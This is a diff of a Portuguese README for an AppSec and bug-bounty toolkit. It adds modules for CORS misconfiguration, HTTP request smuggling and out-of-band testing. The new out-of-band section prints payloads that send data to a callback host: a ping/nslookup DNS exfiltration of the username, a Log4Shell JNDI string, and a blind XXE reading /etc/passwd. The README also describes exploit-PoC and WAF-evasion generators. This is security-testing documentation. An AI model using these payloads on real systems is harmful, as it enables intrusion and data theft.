@@ -50,7 +50,7 @@ A plataforma cobre todas as fases do ciclo de vida de vulnerabilidades:
 
 ---
 
-## 🛠️ Central de Ferramentas AppSec & DevSecOps (24 Módulos)
+## 🛠️ Central de Ferramentas AppSec & DevSecOps (27 Módulos)
 
 Acesse a aba **AppSec** no menu principal para utilizar a suíte integrada de utilitários técnicos:
 
@@ -58,28 +58,31 @@ Acesse a aba **AppSec** no menu principal para utilizar a suíte integrada de ut
 | :-: | :--- | :--- | :--- |
 | **1** | **Calculadora CVSS v4.0** | Pontuação conforme a especificação oficial da FIRST.org | Suporte a grupos de métricas Base, Threat e Environmental; resolução por macro-vetores (EQ1 a EQ6); conversor e parser de vetor string. |
 | **2** | **CVSS v4.0 Component Calculator (Supply Chain)** | Estimativa do sub-score de explorabilidade para dependências e bibliotecas (SCA) | Avalia camada da dependência (*Direct*, *Transitive*, *Build CI*, *Plugin*), alcançabilidade de call-graph, requisitos de ambiente (`AT:P`), status CISA VEX e injeção direta de métricas no calculador CVSS v4.0 principal. |
-| **3** | **Grafo de Ataque Interativo (D3.js) & Kill Chain** | Visualização topológica e encadeamento de exploração | Mapeamento em 4 fases (*Acesso Inicial*, *Escalação*, *Movimentação Lateral* e *Crown Jewels*), taxonomia MITRE ATT&CK, detecção de nós de estrangulamento (*Choke Points*), simulador interativo de caminhos de ataque com reprodução passo a passo e exportação em SVG/JSON. |
-| **4** | **Subdomain Takeover Analyzer** | Auditoria e detecção de CNAMEs e registros DNS órfãos | Base de 15 assinaturas de serviços (AWS S3, GitHub Pages, Heroku, Azure, Vercel, Shopify, Zendesk), verificação de respostas HTTP, cálculo de pontuação CVSS v4 e guia de remediação. |
-| **5** | **ReDoS Studio & Catastrophic Backtracking** | Diagnóstico de expressões regulares vulneráveis a retrocesso exponencial | Detecção de quantificadores aninhados `(a+)+`, alternâncias com sobreposição `(a\|aa)+`, simulador de esgotamento de CPU/Event Loop sem travamento do navegador, gerador de payloads maliciosos e substituições seguras em tempo linear $O(n)$ com RE2. |
-| **6** | **Cloud SSRF & Metadata Exploitation Suite** | Catálogo e construtor de exploração SSRF para nuvem | Endpoints e fluxos para AWS EC2 IMDSv1/v2, GCP Metadata, Azure Managed Identity, Kubelet Read-Only e Docker API; matriz completa de evasão de filtros (Decimal DWORD, Hexadecimal, Octal, IPv6-mapped e DNS Rebinding via `nip.io`). |
-| **7** | **GraphQL Security & Introspection Studio** | Auditoria de segurança de APIs GraphQL | Gerador de introspecção profunda de schema (`__schema`), ataques de negação de serviço por recursão cíclica (Query Depth DoS), bypass de rate limiting por amplificação de aliases (Batching Attack) e regras defensivas para Apollo Server e Express. |
-| **8** | **JWT Security Analyzer** | Auditoria e decodificação profunda de JSON Web Tokens | Detecção de algoritmo `none`, injeções de chaves (`jku`, `jwk`, `kid`), auditoria de expiração (`exp`, `nbf`, `iat`), vazamento de credenciais e gerador de tokens forjados para testes de PoC. |
-| **9** | **CSP Studio & Evaluator** | Avaliação e geração de Content Security Policy (W3C Level 3) | Parser automático de diretivas, detecção de bypass (`unsafe-inline`, `data:`, wildcards `*`), classificação de segurança A+ a F e exportação de snippets para Nginx, Apache e Express Helmet. |
-| **10** | **CVSS v4 + FIRST EPSS Matrix** | Priorização baseada em probabilidade de ameaça em circulação | Matriz 2D correlacionando severidade inerente (CVSS v4.0) com probabilidade estatística de exploração ativa em 30 dias (FIRST EPSS), com cálculo dinâmico de SLAs (P0 a P3). |
-| **11** | **CSRF PoC Studio** | Gerador de Provas de Conceito de Cross-Site Request Forgery | Criação de exploits HTML autocontidos com submissão automática via iframe oculto, suporte a truque JSON (`text/plain`), avaliação de navegabilidade com cookies `SameSite (Lax, Strict, None)` e download `.html`. |
-| **12** | **Payload Multi-Encoder / Decoder** | Canivete suíço de codificações e evasão de filtros WAF | Conversão instantânea e simultânea em URL Encode, Double URL, Base64/Base64URL, Hexadecimal (`\x41`, `0x41`), HTML Entities, Unicode Escape (`\u0041`), SQL `CHAR()` e PowerShell `-Enc`. |
-| **13** | **Security Headers Auditor** | Análise e hardening de cabeçalhos HTTP de segurança | Inspeção de HSTS, `X-Content-Type-Options: nosniff`, `X-Frame-Options`, `Referrer-Policy`, `Permissions-Policy`, detecção de fingerprint em `Server`/`X-Powered-By` e gerador de configs seguras. |
-| **14** | **Mapeador CWE / OWASP Top 10** | Padronização taxonômica de vulnerabilidades | Catálogo das Top CWEs (2023/2024), correlação com OWASP Top 10 2021, descrições detalhadas, exemplos de código vulnerável e guia de mitigação. |
-| **15** | **Construtor de PoC & HTTP** | Geração rápida de requisições de reprodução | Exportação instantânea em comando `cURL`, script em `Python Requests` e requisição `Raw HTTP/1.1` com headers e payloads estruturados. |
-| **16** | **Monitor de SLA de Triagem** | Acompanhamento de conformidade de prazos | Rastreamento de MTTA (*Mean Time to Acknowledge*) e MTTR (*Mean Time to Resolve*); contagem regressiva para breach com base na severidade (Crítico: 24h/7d; Alto: 48h/14d). |
-| **17** | **Macros de Resposta Rápida** | Comunicação padronizada para triadores e hunters | Templates pré-configurados (Solicitação de PoC, Confirmação de Triagem, Notificação de Duplicata, Concessão de Bounty) com interpolação de variáveis dinâmicas (`{hunter}`, `{report_title}`, `{bounty}`, `{cvss}`). |
-| **18** | **Detector de Duplicatas** | Prevenção de relatórios duplicados | Comparador de similaridade de texto (Jaccard + Levenshtein), verificação de correspondência de endpoint e parâmetros vulneráveis em relação aos relatórios já existentes. |
-| **19** | **Matriz & Orçamento de Bounties** | Cálculo justo de recompensas e orçamento | Definição por Criticidade do Ativo (*Tier 1: Core/Auth/Payment*, *Tier 2: API/Customer*, *Tier 3: Marketing/Docs*) e simulação de impacto financeiro no orçamento anual. |
-| **20** | **Calculadora de ROI de Programas & Yield** | Priorização de plataformas e programas de bug bounty | Avaliação de Retorno sobre Investimento (ROI) correlacionando histórico de payouts pagos ($) vs. amplitude de cobertura, saturação de pesquisadores e velocidade de triagem, estimando o rendimento por hora (`$/hora`) do pesquisador. |
-| **21** | **Exportador para Issue Trackers** | Conversão para times de desenvolvimento | Geração de tickets prontos em Markdown técnico para **Jira**, **GitHub Issues** e **GitLab Issues** com passos de reprodução, impacto de negócio e sugestões de correção. |
-| **22** | **Sanitizador DLP (Segredos & PII)** | Proteção antes do envio de relatórios | Scanner em tempo real que detecta e ofusca chaves AWS (`AKIA...`), tokens de acesso GitHub (`ghp_...`), JWTs, senhas em URLs, chaves privadas RSA/OpenSSH e emails. |
-| **23** | **Guia de Remediação de Segredos** | Resposta a incidentes de credenciais vazadas | Procedimento padronizado (SOP) com checklist interativo para rotacionar credenciais, revogar no console de provedores (OpenAI e AWS), auditar telemetria no CloudTrail/Usage Dashboard e encerrar alertas do GitHub Secret Scanning. |
-| **24** | **Simulador de Webhooks** | Notificações e automação de alertas | Disparo e teste de payloads estruturados para **Slack**, **Discord** e **Microsoft Teams**, simulando avisos automáticos de vulnerabilidades críticas. |
+| **3** | **Grafo de Ataque D3.js & Movimentação Lateral** | Visualização topológica conectando Relatórios, CVEs e Domínios Alvo | Simulação física D3.js force-directed com conexões entre domínios de perímetro e VPC interna, relatórios de vulnerabilidade, CVEs (NVD/EPSS), saltos laterais (pivoting) e Crown Jewels corporativos; simulador com autoplay passo a passo, filtros por entidade/domínio e exportação SVG/JSON. |
+| **4** | **CORS Misconfiguration Studio** | Diagnóstico de Cross-Origin Resource Sharing e gerador de exploit PoC | Detecção de reflexão cega de `Origin` com credenciais ativas (`ACAC: true`), confiança indevida na origem `null` (sandbox iframe), regex frágil com ponto não escapado (`targetXcom.com`) ou subdomínio órfão; gera exploit PoC autocontido em HTML com `XMLHttpRequest`/`fetch` e snippets de remediação estrita para Express e Nginx. |
+| **5** | **HTTP Request Smuggling & Desync Inspector** | Análise de discrepâncias de parsing entre Front-end e Back-end | Mapeamento dos vetores `CL.TE`, `TE.CL`, `TE.TE` (ofuscação de header), `H2.TE` (downgrade HTTP/2 para HTTP/1.1) e `CL.0`; visualizador diferencial lado a lado mostrando o resíduo do socket TCP; gerador de scripts em Python de socket puro e Turbo Intruder para testes seguros de timing sem poluir tráfego de produção. |
+| **6** | **Out-of-Band (OOB) Interaction Studio** | Central Collaborator para comprovação de vulnerabilidades cegas | Gerador de tokens dinâmicos para múltiplos protocolos (DNS, HTTP, HTTPS, LDAP); payloads para Blind SSRF (AWS/GCP), Blind XXE (DTD de parâmetro externo), Blind RCE (DNS exfiltration com `dig`/`ping`), OOB-SQLi (`xp_dirtree`/`UTL_INADDR`) e Log4Shell/JNDI; log de callbacks em tempo real e decodificador integrado de subdomínios hexadecimais e base64. |
+| **7** | **Subdomain Takeover Analyzer** | Auditoria e detecção de CNAMEs e registros DNS órfãos | Base de 15 assinaturas de serviços (AWS S3, GitHub Pages, Heroku, Azure, Vercel, Shopify, Zendesk), verificação de respostas HTTP, cálculo de pontuação CVSS v4 e guia de remediação. |
+| **8** | **ReDoS Studio & Catastrophic Backtracking** | Diagnóstico de expressões regulares vulneráveis a retrocesso exponencial | Detecção de quantificadores aninhados `(a+)+`, alternâncias com sobreposição `(a\|aa)+`, simulador de esgotamento de CPU/Event Loop sem travamento do navegador, gerador de payloads maliciosos e substituições seguras em tempo linear $O(n)$ com RE2. |
+| **9** | **Cloud SSRF & Metadata Exploitation Suite** | Catálogo e construtor de exploração SSRF para nuvem | Endpoints e fluxos para AWS EC2 IMDSv1/v2, GCP Metadata, Azure Managed Identity, Kubelet Read-Only e Docker API; matriz completa de evasão de filtros (Decimal DWORD, Hexadecimal, Octal, IPv6-mapped e DNS Rebinding via `nip.io`). |
+| **10** | **GraphQL Security & Introspection Studio** | Auditoria de segurança de APIs GraphQL | Gerador de introspecção profunda de schema (`__schema`), ataques de negação de serviço por recursão cíclica (Query Depth DoS), bypass de rate limiting por amplificação de aliases (Batching Attack) e regras defensivas para Apollo Server e Express. |
+| **11** | **JWT Security Analyzer** | Auditoria e decodificação profunda de JSON Web Tokens | Detecção de algoritmo `none`, injeções de chaves (`jku`, `jwk`, `kid`), auditoria de expiração (`exp`, `nbf`, `iat`), vazamento de credenciais e gerador de tokens forjados para testes de PoC. |
+| **12** | **CSP Studio & Evaluator** | Avaliação e geração de Content Security Policy (W3C Level 3) | Parser automático de diretivas, detecção de bypass (`unsafe-inline`, `data:`, wildcards `*`), classificação de segurança A+ a F e exportação de snippets para Nginx, Apache e Express Helmet. |
+| **13** | **CVSS v4 + FIRST EPSS Matrix** | Priorização baseada em probabilidade de ameaça em circulação | Matriz 2D correlacionando severidade inerente (CVSS v4.0) com probabilidade estatística de exploração ativa em 30 dias (FIRST EPSS), com cálculo dinâmico de SLAs (P0 a P3). |
+| **14** | **CSRF PoC Studio** | Gerador de Provas de Conceito de Cross-Site Request Forgery | Criação de exploits HTML autocontidos com submissão automática via iframe oculto, suporte a truque JSON (`text/plain`), avaliação de navegabilidade com cookies `SameSite (Lax, Strict, None)` e download `.html`. |
+| **15** | **Payload Multi-Encoder / Decoder** | Canivete suíço de codificações e evasão de filtros WAF | Conversão instantânea e simultânea em URL Encode, Double URL, Base64/Base64URL, Hexadecimal (`\x41`, `0x41`), HTML Entities, Unicode Escape (`\u0041`), SQL `CHAR()` e PowerShell `-Enc`. |
+| **16** | **Security Headers Auditor** | Análise e hardening de cabeçalhos HTTP de segurança | Inspeção de HSTS, `X-Content-Type-Options: nosniff`, `X-Frame-Options`, `Referrer-Policy`, `Permissions-Policy`, detecção de fingerprint em `Server`/`X-Powered-By` e gerador de configs seguras. |
+| **17** | **Mapeador CWE / OWASP Top 10** | Padronização taxonômica de vulnerabilidades | Catálogo das Top CWEs (2023/2024), correlação com OWASP Top 10 2021, descrições detalhadas, exemplos de código vulnerável e guia de mitigação. |
+| **18** | **Construtor de PoC & HTTP** | Geração rápida de requisições de reprodução | Exportação instantânea em comando `cURL`, script em `Python Requests` e requisição `Raw HTTP/1.1` com headers e payloads estruturados. |
+| **19** | **Monitor de SLA de Triagem** | Acompanhamento de conformidade de prazos | Rastreamento de MTTA (*Mean Time to Acknowledge*) e MTTR (*Mean Time to Resolve*); contagem regressiva para breach com base na severidade (Crítico: 24h/7d; Alto: 48h/14d). |
+| **20** | **Macros de Resposta Rápida** | Comunicação padronizada para triadores e hunters | Templates pré-configurados (Solicitação de PoC, Confirmação de Triagem, Notificação de Duplicata, Concessão de Bounty) com interpolação de variáveis dinâmicas (`{hunter}`, `{report_title}`, `{bounty}`, `{cvss}`). |
+| **21** | **Detector de Duplicatas** | Prevenção de relatórios duplicados | Comparador de similaridade de texto (Jaccard + Levenshtein), verificação de correspondência de endpoint e parâmetros vulneráveis em relação aos relatórios já existentes. |
+| **22** | **Matriz & Orçamento de Bounties** | Cálculo justo de recompensas e orçamento | Definição por Criticidade do Ativo (*Tier 1: Core/Auth/Payment*, *Tier 2: API/Customer*, *Tier 3: Marketing/Docs*) e simulação de impacto financeiro no orçamento anual. |
+| **23** | **Calculadora de ROI de Programas & Yield** | Priorização de plataformas e programas de bug bounty | Avaliação de Retorno sobre Investimento (ROI) correlacionando histórico de payouts pagos ($) vs. amplitude de cobertura, saturação de pesquisadores e velocidade de triagem, estimando o rendimento por hora (`$/hora`) do pesquisador. |
+| **24** | **Exportador para Issue Trackers** | Conversão para times de desenvolvimento | Geração de tickets prontos em Markdown técnico para **Jira**, **GitHub Issues** e **GitLab Issues** com passos de reprodução, impacto de negócio e sugestões de correção. |
+| **25** | **Sanitizador DLP (Segredos & PII)** | Proteção antes do envio de relatórios | Scanner em tempo real que detecta e ofusca chaves AWS (`AKIA...`), tokens de acesso GitHub (`ghp_...`), JWTs, senhas em URLs, chaves privadas RSA/OpenSSH e emails. |
+| **26** | **Guia de Remediação de Segredos** | Resposta a incidentes de credenciais vazadas | Procedimento padronizado (SOP) com checklist interativo para rotacionar credenciais, revogar no console de provedores (OpenAI e AWS), auditar telemetria no CloudTrail/Usage Dashboard e encerrar alertas do GitHub Secret Scanning. |
+| **27** | **Simulador de Webhooks** | Notificações e automação de alertas | Disparo e teste de payloads estruturados para **Slack**, **Discord** e **Microsoft Teams**, simulando avisos automáticos de vulnerabilidades críticas. |
 
 ---
 
@@ -177,25 +180,35 @@ Acesse a aba **AppSec** no menu principal para utilizar a suíte integrada de ut
    - Ajuste os parâmetros de um novo alvo (amplitude de escopo, saturação de concorrentes, payouts para Crítico/Alto/Médio e dias de resolução).
    - Receba um parecer estratégico em tempo real (*Tier S*, *Tier A*, *Tier B*, etc.) com recomendações táticas para sua carteira de pesquisa.
 
-### 8. Como Utilizar o Grafo de Ataque Interativo (D3.js) & Kill Chain
-1. Na aba **AppSec**, selecione a sub-aba **Attack Graph & Kill Chain**.
-2. **Navegação Topológica D3.js**:
-   - Alterne entre os modos **Estagiado (Kill Chain)** (colunas estruturadas da esquerda para a direita) e **Força Direcionada** (layout orgânico via simulação física de cargas e links).
-   - Use controles de **Zoom (+ / -)**, **Ajustar à Tela (Fit)**, **Reset** e arraste os nós para inspecionar clusters densos.
+### 8. Como Utilizar o Grafo de Ataque Interativo (D3.js) & Movimentação Lateral (Reports, CVEs e Domínios)
+1. Na aba **AppSec**, selecione a sub-aba **Attack Graph & Lateral Movement**.
+2. **Topologia D3.js & Simulação Gravitacional (Force-Directed)**:
+   - Alterne entre os modos **Grafo de Força D3.js** (simulação dinâmica com forças de colisão, atração e repulsão centrada) e **Colunas Kill Chain** (visual estruturado em 4 raias sequenciais MITRE ATT&CK: *Initial Access*, *Privilege Escalation*, *Lateral Movement* e *Crown Jewels*).
+   - Use controles de **Zoom (+ / -)**, **Ajustar à Tela (Fit)**, **Reset de Câmera** e arraste os nós para inspecionar clusters densos.
    - Nós com anel pulsante vermelho e etiqueta dourada identificam **Choke Points** (pontos de estrangulamento onde múltiplos caminhos de ataque convergem).
-3. **Simulador de Caminhos de Ataque (Attack Path Walkthrough)**:
-   - Selecione um dos cenários pré-computados (ex: *SSRF para Comprometimento Total do Cluster Cloud*, *SQL Injection para Dump de Banco e RCE*, *Exposição de Segredos para Exfiltração de S3*).
-   - Utilize os botões **Anterior**, **Play/Pausa** ou **Próximo** para avançar passo a passo pelo kill chain.
-   - O grafo ilumina os nós e arestas do passo atual com partículas animadas, destacando a transição de privilégios e os vetores de transição.
-4. **Inspetor de Ameaças & Nós**:
+3. **Conexões Multidimensionais Integradas**:
+   - 🌐 **Domínios Alvo**: Pontos perimetrais expostos na Internet (`api.finpay-global.com`, `app.cloudmetrics.io`, etc.) e hosts internos na VPC (`internal-billing-db.vpc`, `eks-workers.internal`).
+   - 📄 **Relatórios de Vulnerabilidade**: Findings reportados com ID (`#REP-2024-001`), severidade e pontuação CVSS, conectando diretamente o escopo ao relatório.
+   - 🛡️ **CVEs Identificados**: Mapeamento para vulnerabilidades catalogadas pelo NIST NVD (como CVE-2021-44228, CVE-2023-38606, CVE-2024-21626) com pontuações CVSS e probabilidade de exploração ativa em 30 dias (FIRST EPSS).
+   - ⚡ **Saltos Laterais (Pivots)**: Nós intermediários representando tokens IAM/IMDSv1, sessões administrativas e sub-redes internas.
+   - 👑 **Crown Jewels**: Ativos de impacto máximo (bancos de dados de produção, buckets S3 sensíveis, diretórios de identidade corporativa).
+4. **Simulador de Caminhos de Ataque & Movimentação Lateral**:
+   - Selecione cenários pré-computados (ex: *SSRF para Comprometimento Total do Cluster Cloud via IMDSv1*, *SQL Injection para Dump de Banco e RCE*, *Exposição de Segredos para Exfiltração de S3*).
+   - Utilize os botões **Anterior**, **Play/Pausa** (com autoplay a cada 2s) ou **Próximo** para avançar passo a passo pelo vetor de invasão lateral.
+   - O grafo ilumina os nós e arestas do passo atual com partículas animadas e glow dinâmico, destacando a transição de privilégios e os vetores de transição.
+5. **Filtros Avançados de Topologia**:
+   - Filtre por **Domínio Alvo Específico** para inspecionar a infraestrutura de um único perímetro.
+   - Filtre por **Tipo de Entidade** (apenas Domínios, apenas CVEs, apenas Relatórios, Pivots ou Crown Jewels).
+   - Ative o seletor **Apenas Movimentação Lateral** para ocultar ruído perimetral e focar estritamente nas rotas de pivoteamento interno.
+6. **Inspetor de Ameaças & Topologia**:
    - Clique em qualquer nó do grafo para visualizar no painel lateral:
-     - **Metadados**: Tipo do ativo, estágio do kill chain, severidade e probabilidade de exploração (EPSS).
-     - **Mapeamento MITRE ATT&CK**: Táticas (ex: *Initial Access*, *Privilege Escalation*, *Lateral Movement*, *Exfiltration*) e IDs de Técnicas (ex: `T1190`, `T1552`, `T1021`).
-     - **Raio de Impacto (Blast Radius)**: Ativos adjacentes vulneráveis a salto lateral.
-     - **Ação de Correção Recomendada**: Mitigações práticas para quebrar a cadeia de ataque no ponto mais barato e eficiente.
-5. **Exportação & Integração**:
+     - **Metadados**: Tipo do ativo, estágio do kill chain, severidade, CVSS e probabilidade de exploração (EPSS).
+     - **Mapeamento MITRE ATT&CK**: Táticas (ex: *Initial Access*, *Privilege Escalation*, *Lateral Movement*, *Exfiltration*) e IDs de Técnicas (ex: `T1190`, `T1552`, `T1021`, `T1550`).
+     - **Vizinhos Conectados**: Relações de entrada e saída (domínio alvo hospeda vulnerabilidade, relatório explora CVE, salto lateral para host interno).
+     - **Botão Direto de Navegação**: Para nós de relatório, clique em *Ver Relatório no Gerenciador* para abrir o relatório original instantaneamente.
+7. **Exportação Vetorial & Integração**:
    - **Exportar SVG**: Gera vetor gráfico em alta definição pronto para apresentações executivas e relatórios formais de pentest.
-   - **Exportar JSON**: Baixa a topologia completa com nós, links e cenários para ingestão em SIEMs ou ferramentas de SOAR.
+   - **Exportar JSON**: Baixa a topologia completa com nós, links, CVEs, domínios e cenários para ingestão em SIEMs ou ferramentas de SOAR.
 
 ### 9. Como Auditar Subdomínios Órfãos (Subdomain Takeover Analyzer)
 1. Na aba **AppSec**, selecione a sub-aba **Subdomain Takeover Analyzer**.
@@ -240,6 +253,55 @@ Acesse a aba **AppSec** no menu principal para utilizar a suíte integrada de ut
 3. **Geração de PoC cURL & Regras Defensivas**:
    - Copie o comando cURL formatado com payload JSON pronto para execução via terminal.
    - Aplique os snippets de mitigação para Apollo Server (desativação de introspecção em produção, `graphql-depth-limit` e análise de custo de consulta).
+
+### 13. Como Auditar CORS e Gerar Exploits PoC (CORS Misconfiguration Studio)
+1. Na aba **AppSec**, selecione **CORS Misconfiguration Studio**.
+2. **Seleção de Cenários e Presets**:
+   - *Reflexão Arbitrária com Credenciais (`ACAC: true`)*: O backend reflete a origem do invasor com suporte a cookies/tokens;
+   - *Confiança na Origem "null"*: Exploração através de sandboxed iframes (`<iframe sandbox="allow-scripts">`);
+   - *Regex com Ponto Não Escapado*: Invasores registram domínios homóglifos como `targetXcom.com`;
+   - *Confiança Cega em Subdomínios (`*.target.com`)*: Pivoting a partir de subdomínios vulneráveis a XSS ou CNAME takeover;
+   - *Whitelist Rígida*: Configuração segura recomendada.
+3. **Simulador de Cabeçalhos e Avaliação W3C**:
+   - Ajuste o endpoint alvo, a origem testada e a flag de credenciais (`withCredentials: true`).
+   - Veja imediatamente a análise de conformidade do navegador: se a resposta será legível pelo script invasor e o CVSS correspondente (até 8.8 Crítico).
+4. **Gerador de PoC HTML & Snippets Defensivos**:
+   - Baixe ou copie o arquivo `.html` autocontido pronto para demonstrar a exfiltração de dados em relatórios de Bug Bounty.
+   - Copie os snippets de remediação para Express.js (middleware cors com callback de whitelist) e Nginx (`map $http_origin`).
+
+### 14. Como Diagnosticar HTTP Request Smuggling (HTTP Request Smuggler)
+1. Na aba **AppSec**, selecione **HTTP Request Smuggling & Desync**.
+2. **Vetores Suportados**:
+   - **CL.TE**: Front-end prioriza Content-Length; Back-end prioriza Transfer-Encoding (chunked);
+   - **TE.CL**: Front-end prioriza Transfer-Encoding; Back-end prioriza Content-Length;
+   - **TE.TE**: Desincronização através de cabeçalhos ofuscados (`Transfer-Encoding : chunked`);
+   - **H2.TE**: Downgrade de conexão HTTP/2 da CDN para HTTP/1.1 no servidor de aplicação;
+   - **CL.0**: Back-end descarta corpo em requisições GET, deixando resíduo no socket TCP.
+3. **Visualizador Diferencial de Stream**:
+   - Compare lado a lado como o Front-end e o Back-end delimitam as fronteiras de pacotes.
+   - Visualize em destaque o **Prefixo Contrabandeado** que é anexado à requisição do próximo usuário.
+4. **Scripts de Teste de Timing Não Destrutivo**:
+   - Copie o script Python com socket puro SSL configurado com diferencial de tempo (>8 segundos).
+   - Utilize o script de extensão Turbo Intruder para Burp Suite para testar o envenenamento de fila com segurança.
+5. **Mitigação & Hardening**:
+   - Implementação de HTTP/2 de ponta a ponta, isolamento de conexões TCP e rejeição RFC 7230/9112 (`400 Bad Request`).
+
+### 15. Como Conduzir Testes Fora-de-Banda para Vulnerabilidades Cegas (OOB Collaborator Studio)
+1. Na aba **AppSec**, selecione **OOB & Collaborator Studio**.
+2. **Geração de Token de Escuta Dinâmico**:
+   - O sistema gera automaticamente um domínio de escuta único (ex: `bb-x7k9p2.bounty-oob.net`).
+   - Fornece endpoints simultâneos para consultas DNS, HTTP, HTTPS e LDAP.
+3. **Biblioteca de Payloads Pré-Formatados**:
+   - **Blind SSRF**: Requisição de webhook com callback OOB e extração de metadados AWS IMDSv1;
+   - **Blind XXE**: Definição de parâmetro externo DTD (`eval.dtd`) exfiltrando `/etc/passwd` via HTTP;
+   - **Blind RCE (DNS Exfiltration)**: Payloads para Linux (`ping -c 1 \`whoami\`.${oob}`) e Windows (`nslookup %USERNAME%.${oob}`);
+   - **OOB-SQLi**: Comandos de gatilho para MSSQL (`master..xp_dirtree`), Oracle (`UTL_INADDR`) e PostgreSQL;
+   - **Log4Shell & JNDI**: Payloads LDAP com interpolação de variáveis de ambiente (`${jndi:ldap://${oob}/a}`).
+4. **Log de Callbacks em Tempo Real & Simulador**:
+   - Monitore interações recebidas com identificação de IP de origem, protocolo e timestamp.
+   - Use os botões de simulação rápida (`+DNS`, `+HTTP`, `+LDAP`) para testar o fluxo de ingestão.
+5. **Decodificador Integrado de Dados Exfiltrados**:
+   - Decodifique instantaneamente subdomínios em formato hexadecimal (ex: `726f6f74` ➔ `root`), strings Base64 e codificação de URL.
 
 ---
 
